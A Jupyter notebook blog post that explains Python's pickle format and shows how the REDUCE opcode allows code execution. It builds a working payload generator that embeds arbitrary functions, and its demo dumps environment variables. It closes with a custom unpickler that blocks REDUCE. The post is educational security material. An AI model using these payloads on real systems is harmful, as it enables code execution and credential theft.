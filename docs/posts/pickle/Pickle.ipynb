{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "71109ba8",
   "metadata": {},
   "source": [
    "```\n",
    "title: Tricky Pickle\n",
    "date: 2021-12-19\n",
    "```\n",
    "\n",
    "Everybody knows Python's `pickle` module has prickly edges, just like a real pickle. The [documentation](https://docs.python.org/3/library/pickle.html) even has a big red box right at the top. The `pickle` file format is technically a program for the pickle stack machine, nicely described in [`Lib/pickletools.py`](https://github.com/python/cpython/blob/main/Lib/pickletools.py). Briefly, instructions (opcodes) create Python primitives (`int`s, `str`s, `tuple`s, etc.) on a stack. Some extra bits are used to:\n",
    "* preserve object references across serialization (e.g. if you save a list containing the same object twice, it will be deserialized into the same list rather than a list with two different objects with the same values)\n",
    "* de-duplicate references via a memoization table (an array of already-deserialized objects)\n",
    "* run custom deserialization code on objects\n",
    "\n",
    "Let's take a quick look inside a pickle using the `pickletools` standard library module."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "70c56eae-772f-4cc0-855f-50142167256b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "\n",
    "# Serialize a very simple Python object so we can see the structure of a pickle\n",
    "with open(\"out.pkl\", \"wb\") as f:\n",
    "    # Save the number '0x10'\n",
    "    pickle.dump(0x10, f)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2714df17-414a-4690-9468-355d7aebee51",
   "metadata": {},
   "source": [
    "First let's inspect the raw bytes of `out.pkl` with `xxd`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "44258cac-efa1-4939-8856-902b73ca869f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000: 8004 4b10 2e                             ..K..\n"
     ]
    }
   ],
   "source": [
    "!xxd out.pkl"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "00480e84-d169-4fe2-aa5c-4dd6e5d2cf48",
   "metadata": {},
   "source": [
    "Only 5 bytes, it's practically a nibble. The 0x10 is in there but it still looks mostly like gobbledegook. That's where `pickletools.dis` comes in"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "b40633e4-4aac-49b9-bfa9-0f5080468b62",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: \\x80 PROTO      4\n",
      "    2: K    BININT1    16\n",
      "    4: .    STOP\n",
      "highest protocol among opcodes = 2\n"
     ]
    }
   ],
   "source": [
    "import pickletools\n",
    "\n",
    "with open(\"out.pkl\", \"rb\") as f:\n",
    "    # Read the pickle and dump out a readable version\n",
    "    pickletools.dis(f)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a2e45bad-69ea-4225-8e07-d26b6bd1ecaf",
   "metadata": {},
   "source": [
    "The output here is thankfully small since the pickle is just a few bytes. In a nutshell, this program pushes 0x10 (decimal 16) on the stack, then pops it off and returns it up. For each one:\n",
    "* [`PROTO`](https://github.com/python/cpython/blob/9b52920173735ac609664c6a3a3021d24a95a092/Lib/pickletools.py#L2123) - a version number for the bytes in the pickle (not technically required)\n",
    "* [`BININT1`](https://github.com/python/cpython/blob/9b52920173735ac609664c6a3a3021d24a95a092/Lib/pickletools.py#L1196) - read a 1 byte unsigned integer\n",
    "* [`STOP`](https://github.com/python/cpython/blob/9b52920173735ac609664c6a3a3021d24a95a092/Lib/pickletools.py#L2135) - stop reading bytes (useful if multiple pickles are embedded in the same file)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c34c2123-9c78-4196-9c45-8e726d933b12",
   "metadata": {},
   "source": [
    "## `REDUCE`\n",
    "\n",
    "Pokies of pricklies is the `REDUCE` opcode. When the pickle stack machine runs a `REDUCE` instruction, it will pop from the stack a global reference (in the form of `<module>.<attribute>`, like `__builtin__.print` or `sys.exit`) and a tuple of arguments. So if a malicious user can control the input to the `REDUCE` opcode (which is trivial as we will see if you unpickle user input) they have code execution. When is this actually used? If an object undergoing pickling implements `__reduce__`, it can return these two things (the reference and the argument tuple)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "4c65b42c-8ed9-49d9-a2ec-c8780b826452",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: \\x80 PROTO      4\n",
      "    2: \\x95 FRAME      30\n",
      "   11: \\x8c SHORT_BINUNICODE '__main__'\n",
      "   21: \\x94 MEMOIZE    (as 0)\n",
      "   22: \\x8c SHORT_BINUNICODE 'MyClass'\n",
      "   31: \\x94 MEMOIZE    (as 1)\n",
      "   32: \\x93 STACK_GLOBAL\n",
      "   33: \\x94 MEMOIZE    (as 2)\n",
      "   34: K    BININT1    100\n",
      "   36: \\x85 TUPLE1\n",
      "   37: \\x94 MEMOIZE    (as 3)\n",
      "   38: R    REDUCE\n",
      "   39: \\x94 MEMOIZE    (as 4)\n",
      "   40: .    STOP\n",
      "highest protocol among opcodes = 4\n"
     ]
    }
   ],
   "source": [
    "class MyClass:\n",
    "    def __init__(self, x):\n",
    "        self.x = x\n",
    "    \n",
    "    def __reduce__(self):\n",
    "        return (MyClass, (100,))\n",
    "\n",
    "m = MyClass(12)\n",
    "pickletools.dis(pickle.dumps(m))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "abbfb0f9-83a8-41c6-99e7-5f01116d7cfc",
   "metadata": {},
   "source": [
    "This one is a bit bigger with some special opcodes since pickle has special handling for built-in simple objects like `int` and `list` but not the custom `MyClass`. Consult the docs for details, but long story short `MEMOIZE` codes and `FRAME` are unnecessary:\n",
    "\n",
    "```\n",
    "    0: \\x80 PROTO      4\n",
    "   11: \\x8c SHORT_BINUNICODE '__main__'\n",
    "   22: \\x8c SHORT_BINUNICODE 'MyClass'\n",
    "   32: \\x93 STACK_GLOBAL\n",
    "   34: K    BININT1    100\n",
    "   36: \\x85 TUPLE1\n",
    "   38: R    REDUCE\n",
    "   40: .    STOP\n",
    "highest protocol among opcodes = 4\n",
    "```\n",
    "\n",
    "It helps to read it from top to bottom since that's the way the stack will see things. This pickle program will `REDUCE` (call) a `STACK_GLOBAL` (a reference, here `__main__.MyClass`) with the argument `TUPLE1` (here `tuple(100)`). This also helpfully shows us what we need to replicate in order to execute arbitrary code.\n",
    "\n",
    "## Making Pickles\n",
    "\n",
    "We're going to stop with `pickle.dump` and drop down into saving bytes manually now. `pickletools` will help once again since it contains a nice opcode database out-of-the-box."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "04edf46d-dd01-4b2f-82ad-780799c09def",
   "metadata": {},
   "outputs": [],
   "source": [
    "def to_int(i):\n",
    "    # go from pickletools' opcode description to the byte it represents\n",
    "    return int(i[2:], 16) if i.startswith(\"\\\\x\") else ord(i)\n",
    "\n",
    "# dict of opcode name -> opcode value\n",
    "codes = {c.name: to_int(c.code) for c in pickletools.opcodes}\n",
    "\n",
    "# this helper function will make it easier for us to build pickles\n",
    "def construct(*args):\n",
    "    data = []\n",
    "\n",
    "    for i in args:\n",
    "        if isinstance(i, str):\n",
    "            # encode strings as len, string data as specified by the\n",
    "            # BINUNICODE opcodes\n",
    "            i_bytes = i.encode()\n",
    "            data.append(len(i_bytes))\n",
    "            data += i_bytes\n",
    "        elif isinstance(i, int):\n",
    "            # add ints directly to the byte stream\n",
    "            data.append(i)\n",
    "\n",
    "    return bytes(data)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dbb4f447-08b2-434a-9da9-e733aee2a388",
   "metadata": {},
   "source": [
    "First let's use this API to build the simple pickle from earlier and verify that it is correct via `pickletools`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "eb72c08f-26b1-4ddc-9923-4a23f6eb3ec7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: K    BININT1    16\n",
      "    2: .    STOP\n",
      "highest protocol among opcodes = 1\n"
     ]
    }
   ],
   "source": [
    "data = construct(\n",
    "    codes[\"BININT1\"],\n",
    "    0x10,\n",
    "    codes[\"STOP\"],\n",
    ")\n",
    "\n",
    "pickletools.dis(data)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a42cbf3f-dc58-4709-9158-191fb997b8d2",
   "metadata": {},
   "source": [
    "(note that `PROTO` isn't strictly required). That was easy enough, now let's actually call some Python function with `REDUCE` and `exec`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "07da14ad-098b-4cfc-bf06-9d9b968f5b34",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hello from pickle\n"
     ]
    }
   ],
   "source": [
    "data = construct(\n",
    "    codes[\"SHORT_BINUNICODE\"],\n",
    "    \"__builtin__\",\n",
    "    codes[\"SHORT_BINUNICODE\"],\n",
    "    \"exec\",\n",
    "    codes[\"STACK_GLOBAL\"],\n",
    "    codes[\"SHORT_BINUNICODE\"],\n",
    "    \"print('hello from pickle')\",\n",
    "    codes[\"TUPLE1\"],\n",
    "    codes[\"REDUCE\"],\n",
    "    codes[\"STOP\"],\n",
    ")\n",
    "\n",
    "pickle.loads(data)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b00d27d-242c-4281-aa0a-df261d8ad892",
   "metadata": {},
   "source": [
    "Wowza! This pickle ran the Python code stored as a string in the pickle data via the Python builtin `exec`. We can gussy this up a bit with `inspect` to make crafting payloads easier."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "45635faf-161b-4ac6-9597-e907193b011c",
   "metadata": {},
   "outputs": [],
   "source": [
    "import inspect\n",
    "\n",
    "def call_function_from_pickle(fn):\n",
    "    \"\"\"\n",
    "    Return a pickle that runs 'fn' when it is 'pickle.load'-ed\n",
    "    \"\"\"\n",
    "    return construct(\n",
    "        codes[\"SHORT_BINUNICODE\"],\n",
    "        \"__builtin__\",\n",
    "        codes[\"SHORT_BINUNICODE\"],\n",
    "        \"exec\",\n",
    "        codes[\"STACK_GLOBAL\"],\n",
    "        codes[\"SHORT_BINUNICODE\"],\n",
    "        inspect.getsource(fn).strip() + f\"\\n{fn.__name__}()\",\n",
    "        codes[\"TUPLE1\"],\n",
    "        codes[\"REDUCE\"],\n",
    "        codes[\"STOP\"],\n",
    "    )"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e11f919c-342c-4a41-a60f-8afcf09371d8",
   "metadata": {},
   "source": [
    "This will create a pickle containing the code of whatever function `fn` is passed in as text.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "fb9ddaaf-ffba-42b6-9a89-ce724ad175fb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "MY_SECRET=i dont know how to cook beans without microwaving them\n",
      "\n"
     ]
    }
   ],
   "source": [
    "def show_environment():\n",
    "    import subprocess\n",
    "\n",
    "    proc = subprocess.run([\"printenv\"], stdout=subprocess.PIPE, encoding=\"utf-8\")\n",
    "    print(proc.stdout)\n",
    "\n",
    "data = call_function_from_pickle(show_environment)\n",
    "\n",
    "pickle.loads(data)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4596f088-00e5-408b-af89-bc53461d9030",
   "metadata": {},
   "source": [
    "That's looking pretty nice, and it'd be simple now to instead of `print`-ing that (sensitive) data out that it is shipped off to some attacker-controlled server via `urllib`.\n",
    "\n",
    "## What?\n",
    "\n",
    "This is great but accepting everyone pretty much knows not to load random pickles at this point. If you're really paranoid you can disable `REDUCE` opcodes entirely by messing with some `pickle` internals"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "5495dfb3-5bd2-4220-9d77-2375975d4df3",
   "metadata": {},
   "outputs": [
    {
     "ename": "RuntimeError",
     "evalue": "no REDUCE-ing allowed!",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mRuntimeError\u001b[0m                              Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_396000/12930.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     16\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     17\u001b[0m \u001b[0mmalicious_bytes\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mcall_function_from_pickle\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mshow_environment\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 18\u001b[0;31m \u001b[0mMyUnpickler\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mfile\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mio\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mBytesIO\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmalicious_bytes\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mload\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.9/pickle.py\u001b[0m in \u001b[0;36mload\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m   1210\u001b[0m                     \u001b[0;32mraise\u001b[0m \u001b[0mEOFError\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1211\u001b[0m                 \u001b[0;32massert\u001b[0m \u001b[0misinstance\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mkey\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mbytes_types\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1212\u001b[0;31m                 \u001b[0mdispatch\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mkey\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1213\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0m_Stop\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0mstopinst\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1214\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mstopinst\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvalue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/tmp/ipykernel_396000/12930.py\u001b[0m in \u001b[0;36mno_reduce\u001b[0;34m(*args)\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;32mdef\u001b[0m \u001b[0mno_reduce\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m     \u001b[0;32mraise\u001b[0m \u001b[0mRuntimeError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"no REDUCE-ing allowed!\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mRuntimeError\u001b[0m: no REDUCE-ing allowed!"
     ]
    }
   ],
   "source": [
    "import io\n",
    "\n",
    "def no_reduce(*args):\n",
    "    raise RuntimeError(\"no REDUCE-ing allowed!\")\n",
    "\n",
    "\n",
    "# Create a custom unpickler\n",
    "class MyUnpickler(pickle._Unpickler):\n",
    "    def __init__(self, *args, **kwargs):\n",
    "        super().__init__(*args, **kwargs)\n",
    "\n",
    "        # When pickle sees a REDUCE, it will try to access this entry in the\n",
    "        # table, so make it a stub that throws an error\n",
    "        self.dispatch[pickle.REDUCE[0]] = no_reduce\n",
    "\n",
    "\n",
    "malicious_bytes = call_function_from_pickle(show_environment)\n",
    "MyUnpickler(file=io.BytesIO(malicious_bytes)).load()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
